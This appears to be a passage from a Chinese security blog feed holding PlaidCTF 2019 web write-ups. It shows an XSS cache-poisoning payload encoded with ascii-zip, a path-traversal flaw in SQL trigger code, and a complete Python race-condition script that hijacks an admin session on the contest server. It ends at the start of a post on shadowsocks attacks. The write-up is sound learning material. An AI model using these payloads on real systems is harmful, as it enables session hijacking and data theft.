<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">➜  ~ curl  -v <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">* Rebuilt URL to: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span>/</span><br><span class="line">*   Trying <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>...</span><br><span class="line">* TCP_NODELAY <span class="keyword">set</span></span><br><span class="line">* Connected to <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> (<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>) port <span class="number">5000</span> (#<span class="number">0</span>)</span><br><span class="line">&gt; GET / HTTP/<span class="number">1.1</span></span><br><span class="line">&gt; Host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">&gt; User-Agent: curl/<span class="number">7.54</span><span class="number">.0</span></span><br><span class="line">&gt; Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">&gt;</span></span><br><span class="line"><span class="comment">* HTTP 1.0, assume close after body</span></span><br><span class="line"><span class="comment">&lt; HTTP/1.0 200 OK</span></span><br><span class="line"><span class="comment">&lt; Content-Type: text/html; charset=utf-8</span></span><br><span class="line"><span class="comment">&lt; Content-Encoding: deflate</span></span><br><span class="line"><span class="comment">&lt; Content-Length: 28</span></span><br><span class="line"><span class="comment">&lt; Server: Werkzeug/0.15.2 Python/3.7.0</span></span><br><span class="line"><span class="comment">&lt; Date: Mon, 15 Apr 2019 10:51:26 GMT</span></span><br><span class="line"><span class="comment">&lt;</span></span><br><span class="line"><span class="comment">x��)N.�,(�K�I-*�0Դч</span></span><br><span class="line"><span class="comment">* Closing connection 0</span></span><br><span class="line"><span class="comment">u�%</span></span><br></pre></td></tr></table></figure>
<p>但是浏览器会进行解码，然后弹框。</p>
<p><img src="http://pic.wonderkun.cc/uploads/2019/04/2019-04-15-18-52-53.png" alt="http://pic.wonderkun.cc/uploads/2019/04/2019-04-15-18-52-53.png"></p>
<p>因为使用zlib压缩之后，会变成不可见字符，这里exp使用了另外一种叫做 ascii-zip 的编码，也可以成功被浏览器解码<br>详情请参考<a href="https://github.com/molnarg/ascii-zip" target="_blank" rel="noopener">https://github.com/molnarg/ascii-zip</a></p>
<blockquote>
<p>A deflate compressor that emits compressed data that is in the [A-Za-z0-9] ASCII byte range.</p>
</blockquote>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line"><span class="attr"># just using ascii-zip</span></span><br><span class="line"><span class="attr">wow = 'D0</span>Up<span class="number">0</span>IZU<span class="symbol">nnnnnnnnnnnnnnnnnnnUU5</span><span class="symbol">nnnnnn3</span>SUU<span class="symbol">nUUUwCiudIbEAtwwwEtswGpDttpDDwt3</span>ww<span class="number">03</span>s<span class="name">G333333</span>sww<span class="name">G03333</span>sDDdFPiOMwSgoZOwMYzcoogqffVAaFVvaFvQFVaAfgkuSmVv<span class="symbol">NnFsOzyifOMwSgoy4</span><span class="string">'</span></span><br></pre></td></tr></table></figure>
<p>这样就可以伪造任意响应了，exp给的payload被浏览器解码之后如下图所示：</p>
<p><img src="http://pic.wonderkun.cc/uploads/2019/04/2019-04-15-19-06-12.png" alt="http://pic.wonderkun.cc/uploads/2019/04/2019-04-15-19-06-12.png"></p>
<p>这就样就利用缓存构造了一个存在xss漏洞的页面，把这个链接发给管理员，就可以随意xss了。</p>
<h2 id="0x3-triggered"><a href="#0x3-triggered" class="headerlink" title="0x3 triggered"></a>0x3 triggered</h2><p>这是个代码审计题目，但是有毒的是题目所有的逻辑都是sql语句实现的，其中包括 HTTP 请求包解析，和业务逻辑处理，全是用触发器来依次调用的。为了让大家可以看到这个好玩的题目，我还把这个题目传到了github上，方便大家学习 <a href="https://github.com/wonderkun/CTF_web/tree/master/web300-7" target="_blank" rel="noopener">https://github.com/wonderkun/CTF_web/tree/master/web300-7</a></p>
<p>代码基本可以分为两部分，前800行，主要负责http请求的解析，后面800行主要负责业务逻辑，来生成响应。</p>
<h3 id="目录穿越漏洞"><a href="#目录穿越漏洞" class="headerlink" title="目录穿越漏洞"></a>目录穿越漏洞</h3><p>在web.request 表上有这样的一个触发器用来处理静态资源</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> route_static</span><br><span class="line">  <span class="keyword">BEFORE</span> <span class="keyword">INSERT</span></span><br><span class="line">  <span class="keyword">ON</span> web.request</span><br><span class="line">  <span class="keyword">FOR</span> <span class="keyword">EACH</span> <span class="keyword">ROW</span></span><br><span class="line">  <span class="keyword">WHEN</span> (<span class="keyword">substring</span>(NEW.path, <span class="number">1</span>, <span class="number">8</span>) = <span class="string">'/static/'</span>)</span><br><span class="line">  <span class="keyword">EXECUTE</span> <span class="keyword">PROCEDURE</span> web.handle_static();</span><br></pre></td></tr></table></figure>
<p>跟一下 <code>handle_static</code> 的代码如下： </p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> web.handle_static() <span class="keyword">RETURNS</span> <span class="keyword">trigger</span> <span class="keyword">AS</span> $$</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">  PERFORM web.serve_static(NEW.uid, <span class="keyword">substring</span>(NEW.path, <span class="number">9</span>));</span><br><span class="line">  RETURN NEW;</span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line">$$ LANGUAGE plpgsql;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> web.serve_static(uid <span class="keyword">uuid</span>, <span class="keyword">path</span> <span class="built_in">text</span>) <span class="keyword">RETURNS</span> <span class="built_in">void</span> <span class="keyword">AS</span> $$</span><br><span class="line"><span class="keyword">DECLARE</span></span><br><span class="line">  dot_parts <span class="built_in">text</span>[];</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">  <span class="keyword">SELECT</span></span><br><span class="line">    regexp_split_to_array(<span class="keyword">path</span>, <span class="string">'\.'</span>)</span><br><span class="line">  <span class="keyword">INTO</span> dot_parts;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">INSERT</span> <span class="keyword">INTO</span> web.response_header (</span><br><span class="line">    request_uid,</span><br><span class="line">    <span class="keyword">key</span>,</span><br><span class="line">    <span class="keyword">value</span></span><br><span class="line">  )</span><br><span class="line">  <span class="keyword">SELECT</span></span><br><span class="line">    uid,</span><br><span class="line">    <span class="string">'Content-Type'</span>,</span><br><span class="line">    mime_type</span><br><span class="line">  <span class="keyword">FROM</span></span><br><span class="line">    web.mime_type</span><br><span class="line">  <span class="keyword">WHERE</span></span><br><span class="line">    extension = dot_parts[array_length(dot_parts, <span class="number">1</span>)];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">INSERT</span> <span class="keyword">INTO</span> web.response (</span><br><span class="line">    request_uid,</span><br><span class="line">    <span class="keyword">status</span>,</span><br><span class="line">    status_text,</span><br><span class="line">    <span class="keyword">body</span></span><br><span class="line">  ) <span class="keyword">VALUES</span> (</span><br><span class="line">    uid,</span><br><span class="line">    <span class="number">200</span>,</span><br><span class="line">    <span class="string">'Ok'</span>,</span><br><span class="line">    pg_read_file(<span class="string">'triggered/static/'</span> || <span class="keyword">path</span>)</span><br><span class="line">  );</span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line">$$ LANGUAGE plpgsql;</span><br></pre></td></tr></table></figure>

<p>这里直接使用了 <code>pg_read_file(&#39;triggered/static/&#39; || path)</code>， 显然可以任意文件读取。</p>
<p>本地验证：</p>
<p><img src="http://pic.wonderkun.cc/uploads/2019/04/2019-04-15-20-57-50.png" alt="http://pic.wonderkun.cc/uploads/2019/04/2019-04-15-20-57-50.png"></p>
<p>但是不知道为啥在服务器端却不能成功，一直返回 500，具体原因还不太清楚。</p>
<h3 id="session和cookie的管理"><a href="#session和cookie的管理" class="headerlink" title="session和cookie的管理"></a>session和cookie的管理</h3><p>这个题目有个很让人怀疑的地方就是他的登录流程，是分两步的，先输入用户名，生成cookie和session，然后再输入密码，修改session为登录状态,直接看代码就明白了。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> web.handle_post_login() <span class="keyword">RETURNS</span> <span class="keyword">TRIGGER</span> <span class="keyword">AS</span> $$</span><br><span class="line"><span class="keyword">DECLARE</span></span><br><span class="line">  form_username <span class="built_in">text</span>;</span><br><span class="line">  session_uid uuid;</span><br><span class="line">  form_user_uid uuid;</span><br><span class="line">  context jsonb;</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">  <span class="keyword">SELECT</span></span><br><span class="line">    web.get_form(NEW.uid, <span class="string">'username'</span>)</span><br><span class="line">  <span class="keyword">INTO</span> form_username;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">SELECT</span></span><br><span class="line">    web.get_cookie(NEW.uid, <span class="string">'session'</span>)::<span class="keyword">uuid</span></span><br><span class="line">  <span class="keyword">INTO</span> session_uid;   <span class="comment">-- 查询出来session id</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">SELECT</span></span><br><span class="line">    uid</span><br><span class="line">  <span class="keyword">FROM</span></span><br><span class="line">    web.user</span><br><span class="line">  <span class="keyword">WHERE</span></span><br><span class="line">    username = form_username</span><br><span class="line">  <span class="keyword">INTO</span> form_user_uid;   <span class="comment">-- 查询出来用户id </span></span><br><span class="line"></span><br><span class="line">  IF form_user_uid IS NOT NULL</span><br><span class="line">  THEN</span><br><span class="line">    <span class="keyword">INSERT</span> <span class="keyword">INTO</span> web.session (</span><br><span class="line">      uid,</span><br><span class="line">      user_uid,</span><br><span class="line">      logged_in</span><br><span class="line">    ) <span class="keyword">VALUES</span> (</span><br><span class="line">      <span class="keyword">COALESCE</span>(session_uid, uuid_generate_v4()),</span><br><span class="line">      form_user_uid,</span><br><span class="line">      <span class="literal">FALSE</span></span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">ON</span> CONFLICT (uid)</span><br><span class="line">      <span class="keyword">DO</span> <span class="keyword">UPDATE</span></span><br><span class="line">      <span class="keyword">SET</span></span><br><span class="line">        user_uid = form_user_uid,</span><br><span class="line">        logged_in = <span class="literal">FALSE</span></span><br><span class="line">    <span class="keyword">RETURNING</span> uid</span><br><span class="line">    <span class="keyword">INTO</span> session_uid;</span><br><span class="line"></span><br><span class="line">    PERFORM web.set_cookie(NEW.uid, 'session', session_uid::text);</span><br><span class="line">    PERFORM web.respond_with_redirect(NEW.uid, '/login/password');</span><br><span class="line">  ELSE</span><br><span class="line">    PERFORM web.respond_with_redirect(NEW.uid, '/login');</span><br><span class="line">  <span class="keyword">END</span> <span class="keyword">IF</span>;</span><br><span class="line"></span><br><span class="line">  RETURN NEW;</span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line">$$ LANGUAGE plpgsql;</span><br><span class="line"></span><br><span class="line"><span class="comment">---------- GET /login/password</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> web.handle_get_login_password() <span class="keyword">RETURNS</span> <span class="keyword">TRIGGER</span> <span class="keyword">AS</span> $$</span><br><span class="line"><span class="keyword">DECLARE</span></span><br><span class="line">  session_uid <span class="keyword">uuid</span>;</span><br><span class="line">  logged_in boolean;</span><br><span class="line">  username text;</span><br><span class="line">  context jsonb;</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">  <span class="keyword">SELECT</span></span><br><span class="line">    web.get_cookie(NEW.uid, <span class="string">'session'</span>)::<span class="keyword">uuid</span></span><br><span class="line">  <span class="keyword">INTO</span> session_uid;</span><br><span class="line"></span><br><span class="line">  IF session_uid IS NULL</span><br><span class="line">  THEN</span><br><span class="line">    PERFORM web.respond_with_redirect(NEW.uid, '/login');</span><br><span class="line">    RETURN NEW;</span><br><span class="line">  <span class="keyword">END</span> <span class="keyword">IF</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">SELECT</span></span><br><span class="line">    session.logged_in,</span><br><span class="line">    usr.username</span><br><span class="line">  <span class="keyword">FROM</span></span><br><span class="line">    web.session <span class="keyword">session</span></span><br><span class="line">      <span class="keyword">INNER</span> <span class="keyword">JOIN</span> web.user usr</span><br><span class="line">        <span class="keyword">ON</span> usr.uid = session.user_uid</span><br><span class="line">  <span class="keyword">WHERE</span></span><br><span class="line">    session.uid = session_uid</span><br><span class="line">  <span class="keyword">INTO</span> logged_in, username;</span><br><span class="line"></span><br><span class="line">  IF logged_in</span><br><span class="line">  THEN</span><br><span class="line">    PERFORM web.respond_with_redirect(NEW.uid, '/login');</span><br><span class="line">    RETURN NEW;</span><br><span class="line">  <span class="keyword">END</span> <span class="keyword">IF</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">SELECT</span></span><br><span class="line">    web.get_base_context(NEW.uid)</span><br><span class="line">      || jsonb_build_object(<span class="string">'username'</span>, username)</span><br><span class="line">  <span class="keyword">INTO</span> <span class="keyword">context</span>;</span><br><span class="line"></span><br><span class="line">  PERFORM web.respond_with_template(NEW.uid, 'login-password.html', context);</span><br><span class="line">  RETURN NEW;</span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line">$$ LANGUAGE plpgsql;</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> web.handle_post_login_password() <span class="keyword">RETURNS</span> <span class="keyword">TRIGGER</span> <span class="keyword">AS</span> $$</span><br><span class="line"><span class="keyword">DECLARE</span></span><br><span class="line">  form_password <span class="built_in">text</span>;</span><br><span class="line">  session_uid uuid;</span><br><span class="line">  success boolean;</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">  <span class="keyword">SELECT</span></span><br><span class="line">    web.get_cookie(NEW.uid, <span class="string">'session'</span>)::<span class="keyword">uuid</span></span><br><span class="line">  <span class="keyword">INTO</span> session_uid;</span><br><span class="line"></span><br><span class="line">  IF session_uid IS NULL</span><br><span class="line">  THEN</span><br><span class="line">    PERFORM web.respond_with_redirect(NEW.uid, '/login');</span><br><span class="line">    RETURN NEW;</span><br><span class="line">  <span class="keyword">END</span> <span class="keyword">IF</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">SELECT</span></span><br><span class="line">    web.get_form(NEW.uid, <span class="string">'password'</span>)</span><br><span class="line">  <span class="keyword">INTO</span> form_password;</span><br><span class="line"></span><br><span class="line">  IF form_password IS NULL</span><br><span class="line">  THEN</span><br><span class="line">    PERFORM web.respond_with_redirect(NEW.uid, '/login/password');</span><br><span class="line">    RETURN NEW;</span><br><span class="line">  <span class="keyword">END</span> <span class="keyword">IF</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">SELECT</span> <span class="keyword">EXISTS</span> (</span><br><span class="line">    <span class="keyword">SELECT</span></span><br><span class="line">      *</span><br><span class="line">    <span class="keyword">FROM</span></span><br><span class="line">      web.user usr</span><br><span class="line">        <span class="keyword">INNER</span> <span class="keyword">JOIN</span> web.session <span class="keyword">session</span></span><br><span class="line">          <span class="keyword">ON</span> usr.uid = session.user_uid</span><br><span class="line">    <span class="keyword">WHERE</span></span><br><span class="line">      session.uid = session_uid</span><br><span class="line">        <span class="keyword">AND</span> usr.password_hash = crypt(form_password, usr.password_hash)</span><br><span class="line">  )</span><br><span class="line">  <span class="keyword">INTO</span> <span class="keyword">success</span>;</span><br><span class="line"></span><br><span class="line">  IF success</span><br><span class="line">  THEN</span><br><span class="line">    <span class="keyword">UPDATE</span> web.session</span><br><span class="line">    <span class="keyword">SET</span></span><br><span class="line">      logged_in = <span class="literal">TRUE</span></span><br><span class="line">    <span class="keyword">WHERE</span></span><br><span class="line">      uid = session_uid;</span><br><span class="line"></span><br><span class="line">    PERFORM web.respond_with_redirect(NEW.uid, '/');</span><br><span class="line">  ELSE</span><br><span class="line">    PERFORM web.respond_with_redirect(NEW.uid, '/login/password');</span><br><span class="line">  <span class="keyword">END</span> <span class="keyword">IF</span>;</span><br><span class="line"></span><br><span class="line">  RETURN NEW;</span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line">$$ LANGUAGE plpgsql;</span><br></pre></td></tr></table></figure>

<p>总结一下，操作如下：</p>
<ol>
<li>获取用户提交的用户名和存储在cookie表中的 session_uid</li>
<li>根据用户名，从 user表中查询出来 form_user_uid </li>
<li>然后将 session_uid 和 form_user_uid 和为False的登录状态写入到 session表中，如果session_uid为空(就是用户请求的时候不带session)，则为此用户重新生成一个。 如果 session_uid 在数据库中已经存在，就修改这个 session_uid 对应的 user_uid 为当前登录的用户的id，登录状态设置为false 。</li>
<li>接下来设置 cookie , 并跳转到 <code>/login/password</code></li>
<li>接下来是 post 到 <code>/login/password</code> 的处理流程，同样是获取 <code>session_uid</code>和用户输入的password , 然后把 user表和session表以user_uid相等为条件做一个连接，以 session_uid 和 password 为条件做一次查询。</li>
<li>如果查询到，就更新用户的session为登录状态</li>
</ol>
<p>下面是验证是否登录的代码如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> web.is_logged_in(request_uid <span class="keyword">uuid</span>) <span class="keyword">RETURNS</span> <span class="built_in">boolean</span> <span class="keyword">AS</span> $$</span><br><span class="line"><span class="keyword">DECLARE</span></span><br><span class="line">  session_uid <span class="keyword">uuid</span>;</span><br><span class="line">  ret boolean;</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">  <span class="keyword">SELECT</span></span><br><span class="line">    web.get_cookie(request_uid, <span class="string">'session'</span>)::<span class="keyword">uuid</span></span><br><span class="line">  <span class="keyword">INTO</span> session_uid;</span><br><span class="line"></span><br><span class="line">  IF session_uid IS NULL</span><br><span class="line">  THEN</span><br><span class="line">    RETURN FALSE;</span><br><span class="line">  <span class="keyword">END</span> <span class="keyword">IF</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">SELECT</span></span><br><span class="line">    logged_in</span><br><span class="line">  <span class="keyword">FROM</span></span><br><span class="line">    web.session</span><br><span class="line">  <span class="keyword">WHERE</span></span><br><span class="line">    uid = session_uid</span><br><span class="line">  <span class="keyword">INTO</span></span><br><span class="line">    ret;</span><br><span class="line"></span><br><span class="line">  RETURN COALESCE(ret, FALSE);</span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line">$$ LANGUAGE plpgsql;</span><br></pre></td></tr></table></figure>

<p>这个过程存在一个竞争条件，如果用户A使用session_A并处于登录状态，此时用户B也使用session_A进行登录(仅输入用户名)，这时用户B就可以修改数据库中存储的session_A对应的user_id,并将A设置为未登录状态。 如果此时恰好A用户在执行某个耗时的操作，并且已经执行过<code>is_logged_in</code> 函数的校验，那么接下来A用户的所有操作都是B用户的身份执行的。 </p>
<h3 id="竞争条件的利用"><a href="#竞争条件的利用" class="headerlink" title="竞争条件的利用"></a>竞争条件的利用</h3><p>因为这个竞争发生在<code>is_logged_in</code>函数执行之后，一次操作完成之前，所以时间窗口还是比较小的，所以要找一个相对来说比较耗时的操作。题目中有个搜索操作，代码如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> web.handle_post_search() <span class="keyword">RETURNS</span> <span class="keyword">TRIGGER</span> <span class="keyword">AS</span> $$</span><br><span class="line"><span class="keyword">DECLARE</span></span><br><span class="line">  user_uid <span class="keyword">uuid</span>;</span><br><span class="line">  session_uid uuid;</span><br><span class="line">  query_string text;</span><br><span class="line">  query tsquery;</span><br><span class="line">  context jsonb;</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">  <span class="keyword">IF</span> <span class="keyword">NOT</span> web.is_logged_in(NEW.uid)</span><br><span class="line">  <span class="keyword">THEN</span></span><br><span class="line">    PERFORM web.respond_with_redirect(NEW.uid, <span class="string">'/login'</span>);</span><br><span class="line">    RETURN NEW;</span><br><span class="line">  <span class="keyword">END</span> <span class="keyword">IF</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">SELECT</span></span><br><span class="line">    web.get_form(NEW.uid, <span class="string">'query'</span>)</span><br><span class="line">  <span class="keyword">INTO</span> query_string;</span><br><span class="line"></span><br><span class="line">  IF query_string IS NULL OR trim(query_string) = ''</span><br><span class="line">  THEN</span><br><span class="line">    PERFORM web.respond_with_redirect(NEW.uid, '/search');</span><br><span class="line">    RETURN NEW;</span><br><span class="line">  <span class="keyword">END</span> <span class="keyword">IF</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">BEGIN</span></span><br><span class="line">    <span class="keyword">SELECT</span></span><br><span class="line">      web.query_to_tsquery(query_string)</span><br><span class="line">    <span class="keyword">INTO</span> <span class="keyword">query</span>;</span><br><span class="line">  EXCEPTION WHEN OTHERS THEN</span><br><span class="line">    PERFORM web.respond_with_redirect(NEW.uid, '/search');</span><br><span class="line">    RETURN NEW;</span><br><span class="line">  <span class="keyword">END</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">SELECT</span></span><br><span class="line">    web.get_cookie(NEW.uid, <span class="string">'session'</span>)::<span class="keyword">uuid</span></span><br><span class="line">  <span class="keyword">INTO</span> session_uid;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">SELECT</span></span><br><span class="line">    session.user_uid</span><br><span class="line">  <span class="keyword">FROM</span></span><br><span class="line">    web.session <span class="keyword">session</span></span><br><span class="line">  <span class="keyword">WHERE</span></span><br><span class="line">    session.uid = session_uid</span><br><span class="line">  <span class="keyword">INTO</span> user_uid;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">SELECT</span></span><br><span class="line">    web.get_base_context(NEW.uid)</span><br><span class="line">  <span class="keyword">INTO</span> <span class="keyword">context</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">WITH</span> notes <span class="keyword">AS</span> (</span><br><span class="line">    <span class="keyword">SELECT</span></span><br><span class="line">      jsonb_build_object(</span><br><span class="line">        <span class="string">'author'</span>, usr.username,</span><br><span class="line">        <span class="string">'title'</span>, note.title,</span><br><span class="line">        <span class="string">'content'</span>, note.content,</span><br><span class="line">        <span class="string">'date'</span>, to_char(note.date, <span class="string">'HH:MIam on Month DD, YYYY'</span>)</span><br><span class="line">      ) <span class="keyword">AS</span> obj</span><br><span class="line">    <span class="keyword">FROM</span></span><br><span class="line">      web.note note</span><br><span class="line">        <span class="keyword">INNER</span> <span class="keyword">JOIN</span> web.user usr</span><br><span class="line">          <span class="keyword">ON</span> note.author_uid = usr.uid</span><br><span class="line">    <span class="keyword">WHERE</span></span><br><span class="line">      usr.uid = user_uid</span><br><span class="line">        <span class="keyword">AND</span> note.search @@ <span class="keyword">query</span></span><br><span class="line">  )</span><br><span class="line">  <span class="keyword">SELECT</span></span><br><span class="line">    <span class="keyword">context</span></span><br><span class="line">      || jsonb_build_object(</span><br><span class="line">        <span class="string">'search'</span>, query_string,</span><br><span class="line">        <span class="string">'results'</span>, <span class="keyword">COALESCE</span>(jsonb_agg(notes.obj), <span class="string">'[]'</span>::jsonb)</span><br><span class="line">      )</span><br><span class="line">  <span class="keyword">FROM</span></span><br><span class="line">    notes</span><br><span class="line">  <span class="keyword">INTO</span> <span class="keyword">context</span>;</span><br><span class="line"></span><br><span class="line">  PERFORM web.respond_with_template(NEW.uid, 'search.html', context);</span><br><span class="line">  RETURN NEW;</span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line">$$ LANGUAGE plpgsql;</span><br></pre></td></tr></table></figure>

<p>按照刚才的分析，我们只需要发送一个很长的 query_string，使得<code>web.query_to_tsquery(query_string)</code>的执行时间很长，在这个函数执行期间，在用admin身份带上我们用户的session去请求登录，就可以修改掉我们用户的 user_id,接下里的操作就是以管理员身份执行的了：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">  session.user_uid</span><br><span class="line"><span class="keyword">FROM</span></span><br><span class="line">  web.session <span class="keyword">session</span></span><br><span class="line"><span class="keyword">WHERE</span></span><br><span class="line">  session.uid = session_uid</span><br><span class="line"><span class="keyword">INTO</span> user_uid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">  web.get_base_context(NEW.uid)</span><br><span class="line"><span class="keyword">INTO</span> <span class="keyword">context</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">WITH</span> notes <span class="keyword">AS</span> (</span><br><span class="line">  <span class="keyword">SELECT</span></span><br><span class="line">    jsonb_build_object(</span><br><span class="line">      <span class="string">'author'</span>, usr.username,</span><br><span class="line">      <span class="string">'title'</span>, note.title,</span><br><span class="line">      <span class="string">'content'</span>, note.content,</span><br><span class="line">      <span class="string">'date'</span>, to_char(note.date, <span class="string">'HH:MIam on Month DD, YYYY'</span>)</span><br><span class="line">    ) <span class="keyword">AS</span> obj</span><br><span class="line">  <span class="keyword">FROM</span></span><br><span class="line">    web.note note</span><br><span class="line">      <span class="keyword">INNER</span> <span class="keyword">JOIN</span> web.user usr</span><br><span class="line">        <span class="keyword">ON</span> note.author_uid = usr.uid</span><br><span class="line">  <span class="keyword">WHERE</span></span><br><span class="line">    usr.uid = user_uid</span><br><span class="line">      <span class="keyword">AND</span> note.search @@ <span class="keyword">query</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>构造适当的查询语句，就可以查出flag。</p>
<p>最后的exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(username)</span>:</span></span><br><span class="line"></span><br><span class="line">    url = <span class="string">"http://triggered.pwni.ng:52856/login"</span></span><br><span class="line">    data = &#123;<span class="string">"username"</span>:username&#125;</span><br><span class="line"></span><br><span class="line">    res = s.post(url,data=data)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"[*] login with username"</span>)</span><br><span class="line"><span class="comment">#     print(res.text)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login_password</span><span class="params">(password)</span>:</span></span><br><span class="line">    url = <span class="string">"http://triggered.pwni.ng:52856/login/password"</span></span><br><span class="line">    data = &#123;<span class="string">"password"</span>:password&#125;</span><br><span class="line"></span><br><span class="line">    res = s.post(url,data=data)</span><br><span class="line">    print(<span class="string">"[*] login with password"</span>)</span><br><span class="line"><span class="comment">#     print(res.text)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">query</span><span class="params">(condition)</span>:</span></span><br><span class="line">    url = <span class="string">"http://triggered.pwni.ng:52856/search"</span></span><br><span class="line">    data = &#123;<span class="string">"query"</span>:condition&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        res = s.post(url,data=data)</span><br><span class="line">        print(<span class="string">"[*] query a note ..."</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"no result"</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            print(res.text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> res.status_code != <span class="number">200</span> :</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    login(<span class="string">"test"</span>)</span><br><span class="line">    login_password(<span class="string">"123"</span>)</span><br><span class="line"></span><br><span class="line">    t1 = threading.Thread(target=query,args=(<span class="string">" \"PCTF\" or "</span>*<span class="number">10</span>+ <span class="string">" \"PCTF\" "</span> ,))</span><br><span class="line">    t1.start()</span><br><span class="line">    <span class="comment"># time.sleep(3)</span></span><br><span class="line">    t2 = threading.Thread(target=login,args=(<span class="string">"admin"</span>,))</span><br><span class="line">    t2.start()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>hack_ctf</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>CTF</tag>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>shadowsocks的通信原理以及攻击方法分析</title>
    <url>/2020/02/18/shadowsocks%E7%9A%84%E9%80%9A%E4%BF%A1%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>发现shadowsocks的通信协议出现了重大的安全问题，比较好奇，学习一下。</p>
<a id="more"></a>

<h2 id="0x1-复习一下socks5-协议"><a href="#0x1-复习一下socks5-协议" class="headerlink" title="0x1 复习一下socks5 协议"></a>0x1 复习一下socks5 协议</h2><p>socks5代理协议是一个非常轻量级，简单却实用的代理协议。整个协议其实就是在建立TCP连接之后，在真正的内容传输之前，加一点内容。</p>
<p>通讯中各部分的定义如下：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">    /-&gt; | Firewall(防火墙) | -&gt;\</span><br><span class="line">Client -&gt; Server(代理服务器) -&gt; Dst(目标地址)</span><br></pre></td></tr></table></figure>

<h3 id="第一步，Client与Server建立连接"><a href="#第一步，Client与Server建立连接" class="headerlink" title="第一步，Client与Server建立连接"></a>第一步，Client与Server建立连接</h3><p>建立TCP连接之后，Client发送如下数据：</p>
